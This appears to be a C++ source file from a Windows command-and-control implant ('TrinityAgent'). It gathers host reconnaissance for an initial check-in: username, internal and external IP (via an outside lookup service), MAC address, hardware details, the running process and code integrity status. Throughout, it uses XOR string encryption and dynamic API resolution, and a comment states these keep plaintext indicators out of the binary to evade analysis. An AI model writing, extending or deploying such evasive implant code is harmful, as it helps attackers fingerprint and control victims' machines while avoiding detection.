// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <iphlpapi.h>
#include <winhttp.h>
#include <tlhelp32.h>

#include <array>
#include <cstdio>
#include <cstdlib>
#include <iomanip>
#include <memory>
#include <sstream>
#include <string>
#include <thread>
#include <utility>
#include <vector>

#include "agent/host/host_info.h"
#include "agent/util/api_resolver.h"
#include "agent/util/process.h"
#include "agent/util/strings.h"
#include "xorstr/xorstr.hpp"

namespace {

    [[nodiscard]] std::string TrimTrailingNewline(std::string value) {
        while (!value.empty() && (value.back() == '\n' || value.back() == '\r')) {
            value.pop_back();
        }
        return value;
    }

    // Fetch the public IP from ipify. Returns "Unknown" on any failure.
    [[nodiscard]] std::string FetchExternalIp() {
        const HMODULE winhttp = agent::util::get_module(xorstr_("winhttp.dll"));
        const auto win_http_open = agent::util::resolve_api<decltype(&WinHttpOpen)>(winhttp, xorstr_("WinHttpOpen"));
        const auto win_http_connect =
            agent::util::resolve_api<decltype(&WinHttpConnect)>(winhttp, xorstr_("WinHttpConnect"));
        const auto win_http_open_request =
            agent::util::resolve_api<decltype(&WinHttpOpenRequest)>(winhttp, xorstr_("WinHttpOpenRequest"));
        const auto win_http_send_request =
            agent::util::resolve_api<decltype(&WinHttpSendRequest)>(winhttp, xorstr_("WinHttpSendRequest"));
        const auto win_http_receive_response =
            agent::util::resolve_api<decltype(&WinHttpReceiveResponse)>(winhttp, xorstr_("WinHttpReceiveResponse"));
        const auto win_http_query_data_available = agent::util::resolve_api<decltype(&WinHttpQueryDataAvailable)>(
            winhttp, xorstr_("WinHttpQueryDataAvailable"));
        const auto win_http_read_data =
            agent::util::resolve_api<decltype(&WinHttpReadData)>(winhttp, xorstr_("WinHttpReadData"));
        const auto win_http_close_handle =
            agent::util::resolve_api<decltype(&WinHttpCloseHandle)>(winhttp, xorstr_("WinHttpCloseHandle"));

        const std::wstring host(xorstr_(L"api.ipify.org"));
        HINTERNET session = win_http_open(xorstr_(L"TrinityAgent/1.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (session == nullptr) {
            return xorstr_("Unknown");
        }
        HINTERNET connect = win_http_connect(session, host.c_str(), INTERNET_DEFAULT_HTTP_PORT, 0);
        if (connect == nullptr) {
            win_http_close_handle(session);
            return xorstr_("Unknown");
        }
        HINTERNET request = win_http_open_request(connect, L"GET", L"/", nullptr, WINHTTP_NO_REFERER, nullptr, 0);
        if (request == nullptr) {
            win_http_close_handle(connect);
            win_http_close_handle(session);
            return xorstr_("Unknown");
        }
        if (!win_http_send_request(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
            !win_http_receive_response(request, nullptr)) {
            win_http_close_handle(request);
            win_http_close_handle(connect);
            win_http_close_handle(session);
            return xorstr_("Unknown");
        }

        std::string ip;
        DWORD bytes_available = 0;
        while (win_http_query_data_available(request, &bytes_available) && bytes_available > 0) {
            std::vector<char> chunk(bytes_available);
            DWORD read = 0;
            if (win_http_read_data(request, chunk.data(), bytes_available, &read)) {
                ip.append(chunk.data(), read);
            }
            bytes_available = 0;
        }
        win_http_close_handle(request);
        win_http_close_handle(connect);
        win_http_close_handle(session);
        return ip.empty() ? xorstr_("Unknown") : ip;
    }

}  // namespace

namespace agent::host {

    std::string GetUsername() {
        const HMODULE advapi32 = agent::util::get_module(xorstr_("advapi32.dll"));
        const auto get_user_name = agent::util::resolve_api<decltype(&GetUserNameW)>(advapi32, xorstr_("GetUserNameW"));

        // Two-call pattern: the first call is expected to fail with
        // ERROR_INSUFFICIENT_BUFFER and reports the required size (in TCHARs).
        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamew
        DWORD size = 0;
        get_user_name(nullptr, &size);
        if (size == 0) {
            return {};
        }

        std::vector<wchar_t> buffer(size, 0);
        if (get_user_name(buffer.data(), &size) == 0) {
            return {};
        }
        return agent::util::ToUtf8(buffer.data());
    }

    std::string GetInternalIP() {
        const HMODULE iphlpapi = agent::util::get_module(xorstr_("iphlpapi.dll"));
        const auto get_adapters =
            agent::util::resolve_api<decltype(&GetAdaptersAddresses)>(iphlpapi, xorstr_("GetAdaptersAddresses"));
        const HMODULE ws2_32 = agent::util::get_module(xorstr_("ws2_32.dll"));
        const auto inet_ntop = agent::util::resolve_api<decltype(&::inet_ntop)>(ws2_32, xorstr_("inet_ntop"));

        ULONG buffer_size = 15360;
        std::vector<char> probe(buffer_size);
        auto* adapter = reinterpret_cast<IP_ADAPTER_ADDRESSES*>(probe.data());
        DWORD result = get_adapters(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, nullptr, adapter, &buffer_size);
        if (result == ERROR_BUFFER_OVERFLOW) {
            probe.resize(buffer_size);
            adapter = reinterpret_cast<IP_ADAPTER_ADDRESSES*>(probe.data());
            result = get_adapters(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, nullptr, adapter, &buffer_size);
        }
        if (result != NO_ERROR) {
            return {};
        }

        std::string ip;
        while (adapter != nullptr) {
            if (adapter->IfType != IF_TYPE_SOFTWARE_LOOPBACK && adapter->OperStatus == IfOperStatusUp) {
                for (auto* unicast = adapter->FirstUnicastAddress; unicast != nullptr; unicast = unicast->Next) {
                    if (unicast->Address.lpSockaddr->sa_family == AF_INET) {
                        auto* address = reinterpret_cast<sockaddr_in*>(unicast->Address.lpSockaddr);
                        std::array<char, INET_ADDRSTRLEN> ip_buffer{};
                        if (inet_ntop(AF_INET, &address->sin_addr, ip_buffer.data(),
                                      static_cast<socklen_t>(ip_buffer.size())) != nullptr) {
                            ip = ip_buffer.data();
                            break;
                        }
                    }
                }
            }
            if (!ip.empty()) {
                break;
            }
            adapter = adapter->Next;
        }
        return ip;
    }

    std::string GetExternalIP() { return FetchExternalIp(); }

    std::string GetOSVersion() {
        // Read the NTOS version from the shared user data block (RtlGetVersion is not
        // exported by MinGW). Major/Minor/Build live at fixed offsets.
        const auto* shared = reinterpret_cast<const std::uint32_t*>(0x7FFE0000);
        const std::uint32_t major = shared[0x268 / 4];
        const std::uint32_t minor = shared[0x26C / 4];
        const std::uint32_t build = shared[0x270 / 4];
        return std::string(xorstr_("Windows ")) + std::to_string(major) + "." + std::to_string(minor) + "." +
               std::to_string(build);
    }

    std::string GetMachineMAC() {
        const HMODULE iphlpapi = agent::util::get_module(xorstr_("iphlpapi.dll"));
        const auto get_adapters =
            agent::util::resolve_api<decltype(&GetAdaptersAddresses)>(iphlpapi, xorstr_("GetAdaptersAddresses"));

        ULONG buffer_size = 15360;
        std::vector<char> probe(buffer_size);
        auto* adapter = reinterpret_cast<IP_ADAPTER_ADDRESSES*>(probe.data());
        ULONG flags = GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST;
        ULONG result = get_adapters(AF_UNSPEC, flags, nullptr, adapter, &buffer_size);
        if (result == ERROR_BUFFER_OVERFLOW) {
            probe.resize(buffer_size);
            adapter = reinterpret_cast<IP_ADAPTER_ADDRESSES*>(probe.data());
            result = get_adapters(AF_UNSPEC, flags, nullptr, adapter, &buffer_size);
        }
        if (result != NO_ERROR) {
            return xorstr_("00:00:00:00:00:00");
        }

        std::string mac;
        while (adapter != nullptr) {
            if (adapter->OperStatus == IfOperStatusUp && adapter->PhysicalAddressLength >= 6) {
                char mac_buffer[18];
                snprintf(mac_buffer, sizeof(mac_buffer), xorstr_("%02X:%02X:%02X:%02X:%02X:%02X"),
                         adapter->PhysicalAddress[0], adapter->PhysicalAddress[1], adapter->PhysicalAddress[2],
                         adapter->PhysicalAddress[3], adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
                mac = mac_buffer;
                break;
            }
            adapter = adapter->Next;
        }
        return mac.empty() ? xorstr_("00:00:00:00:00:00") : mac;
    }

    std::string GetMotherboard() {
        return TrimTrailingNewline(agent::util::CaptureCommandOutput(
            xorstr_("powershell -NoProfile -Command \"(Get-CimInstance Win32_BaseBoard).Product\"")));
    }

    int GetRamMb() {
        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto global_memory_status_ex =
            agent::util::resolve_api<decltype(&GlobalMemoryStatusEx)>(kernel32, xorstr_("GlobalMemoryStatusEx"));
        MEMORYSTATUSEX status = {};
        status.dwLength = sizeof(status);
        if (!global_memory_status_ex(&status)) {
            return 0;
        }
        return static_cast<int>(status.ullTotalPhys / (1024ULL * 1024ULL));
    }

    std::pair<double, double> GetDiskSize() {
        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto get_disk_free_space_ex =
            agent::util::resolve_api<decltype(&GetDiskFreeSpaceExW)>(kernel32, xorstr_("GetDiskFreeSpaceExW"));
        ULARGE_INTEGER total = {};
        ULARGE_INTEGER free_space = {};
        ULARGE_INTEGER available = {};
        if (!get_disk_free_space_ex(L"C:\\", &free_space, &total, &available)) {
            return {0.0, 0.0};
        }
        const double total_gb = static_cast<double>(total.QuadPart) / (1024.0 * 1024.0 * 1024.0);
        const double free_gb = static_cast<double>(free_space.QuadPart) / (1024.0 * 1024.0 * 1024.0);
        return {total_gb, free_gb};
    }

    int GetCpuCount() {
        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto get_system_info =
            agent::util::resolve_api<decltype(&GetSystemInfo)>(kernel32, xorstr_("GetSystemInfo"));
        SYSTEM_INFO info = {};
        get_system_info(&info);
        return static_cast<int>(info.dwNumberOfProcessors);
    }

    int GetPID() {
        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto get_current_process_id =
            agent::util::resolve_api<decltype(&GetCurrentProcessId)>(kernel32, xorstr_("GetCurrentProcessId"));
        return static_cast<int>(get_current_process_id());
    }

    std::string GetProcessName() {
        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto get_current_process_id =
            agent::util::resolve_api<decltype(&GetCurrentProcessId)>(kernel32, xorstr_("GetCurrentProcessId"));
        const auto create_snapshot = agent::util::resolve_api<decltype(&CreateToolhelp32Snapshot)>(
            kernel32, xorstr_("CreateToolhelp32Snapshot"));
        const auto process32_first =
            agent::util::resolve_api<decltype(&Process32FirstW)>(kernel32, xorstr_("Process32FirstW"));
        const auto process32_next =
            agent::util::resolve_api<decltype(&Process32NextW)>(kernel32, xorstr_("Process32NextW"));
        const auto close_handle = agent::util::resolve_api<decltype(&CloseHandle)>(kernel32, xorstr_("CloseHandle"));

        const DWORD pid = get_current_process_id();
        HANDLE snapshot = create_snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            return xorstr_("Unknown");
        }
        PROCESSENTRY32W entry = {};
        entry.dwSize = sizeof(entry);
        std::string name;
        if (process32_first(snapshot, &entry)) {
            while (true) {
                if (entry.th32ProcessID == pid) {
                    name = agent::util::ToUtf8(entry.szExeFile);
                    break;
                }
                if (!process32_next(snapshot, &entry)) {
                    break;
                }
            }
        }
        close_handle(snapshot);
        return name.empty() ? xorstr_("Unknown") : name;
    }

    // Code Integrity (CI) status.
    // Ref: "Discover Code Integrity Protection Status" (s12deff)
    // https://medium.com/@s12deff/discover-code-integrity-protection-status-d5119fa96bd5
    //
    // NtQuerySystemInformation(SystemCodeIntegrityInformation) returns a
    // SYSTEM_CODEINTEGRITY_INFORMATION whose CodeIntegrityOptions field is a bitmask of the
    // CODEINTEGRITY_OPTION_* flags. Every set bit is translated into a readable name, matching
    // the reference's PrintCodeIntegrityOptions behaviour.
    [[nodiscard]] std::string GetCodeIntegrityStatus() {
        constexpr ULONG kSystemCodeIntegrityInformation = 103;  // SystemCodeIntegrityInformation (0x67)

        struct SystemCodeIntegrityInformation {
            ULONG length;
            ULONG code_integrity_options;
        };

        const HMODULE ntdll = agent::util::get_module(xorstr_("ntdll.dll"));
        const auto query_system_information = agent::util::resolve_api<NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG)>(
            ntdll, xorstr_("NtQuerySystemInformation"));
        if (query_system_information == nullptr) {
            return xorstr_("Unavailable");
        }

        SystemCodeIntegrityInformation info{};
        info.length = sizeof(SystemCodeIntegrityInformation);

        const NTSTATUS status = query_system_information(kSystemCodeIntegrityInformation, &info, sizeof(info), nullptr);
        if (status != 0) {
            std::ostringstream failed;
            failed << xorstr_("QueryFailed(0x") << std::hex << status << xorstr_(")");
            return failed.str();
        }

        std::ostringstream options;
        options << xorstr_("0x") << std::hex << std::setw(4) << std::setfill('0') << info.code_integrity_options;
        bool first = true;
        // Bit values and names follow the reference implementation (EfiGuard sysinfo.cpp).
        // The names are xorstr_-encrypted and appended in-place so no plaintext flag name
        // survives in the binary.
        for (ULONG index = 0; index < 16; ++index) {
            const ULONG bit = 1UL << index;
            if ((info.code_integrity_options & bit) == 0) {
                continue;
            }
            options << (first ? xorstr_(":") : xorstr_(","));
            first = false;
            switch (bit) {
                case 0x0001:
                    options << xorstr_("CODEINTEGRITY_OPTION_ENABLED");
                    break;
                case 0x0002:
                    options << xorstr_("CODEINTEGRITY_OPTION_TESTSIGN");
                    break;
                case 0x0004:
                    options << xorstr_("CODEINTEGRITY_OPTION_UMCI_ENABLED");
                    break;
                case 0x0008:
                    options << xorstr_("CODEINTEGRITY_OPTION_UMCI_AUDITMODE_ENABLED");
                    break;
                case 0x0010:
                    options << xorstr_("CODEINTEGRITY_OPTION_UMCI_EXCLUSIONPATHS_ENABLED");
                    break;
                case 0x0020:
                    options << xorstr_("CODEINTEGRITY_OPTION_TEST_BUILD");
                    break;
                case 0x0040:
                    options << xorstr_("CODEINTEGRITY_OPTION_PREPRODUCTION_BUILD");
                    break;
                case 0x0080:
                    options << xorstr_("CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED");
                    break;
                case 0x0100:
                    options << xorstr_("CODEINTEGRITY_OPTION_FLIGHT_BUILD");
                    break;
                case 0x0200:
                    options << xorstr_("CODEINTEGRITY_OPTION_FLIGHTING_ENABLED");
                    break;
                case 0x0400:
                    options << xorstr_("CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED");
                    break;
                case 0x0800:
                    options << xorstr_("CODEINTEGRITY_OPTION_HVCI_KMCI_AUDITMODE_ENABLED");
                    break;
                case 0x1000:
                    options << xorstr_("CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED");
                    break;
                case 0x2000:
                    options << xorstr_("CODEINTEGRITY_OPTION_HVCI_IUM_ENABLED");
                    break;
                case 0x4000:
                    options << xorstr_("CODEINTEGRITY_OPTION_WHQL_ENFORCEMENT_ENABLED");
                    break;
                case 0x8000:
                    options << xorstr_("CODEINTEGRITY_OPTION_WHQL_AUDITMODE_ENABLED");
                    break;
                default:
                    options << xorstr_("CODEINTEGRITY_OPTION_UNKNOWN");
                    break;
            }
        }

        return options.str();
    }

    models::InitialCheckinRequest GetHostInformation() {
        models::InitialCheckinRequest request;
        request.internal_ip = GetInternalIP();
        request.external_ip = GetExternalIP();
        request.os = GetOSVersion();
        request.username = GetUsername();
        request.process_name = GetProcessName();
        request.integrity = GetCodeIntegrityStatus();
        request.mac_address = GetMachineMAC();
        request.motherboard = GetMotherboard();
        request.pid = GetPID();
        request.ram_mb = GetRamMb();
        const auto [total, free_space] = GetDiskSize();
        request.disk_total_gb = total;
        request.disk_free_gb = free_space;
        request.cpu_count = GetCpuCount();
        return request;
    }

}  // namespace agent::host
#endif  // _WIN32
        // ========================================== { END OF FILE } ========================================== //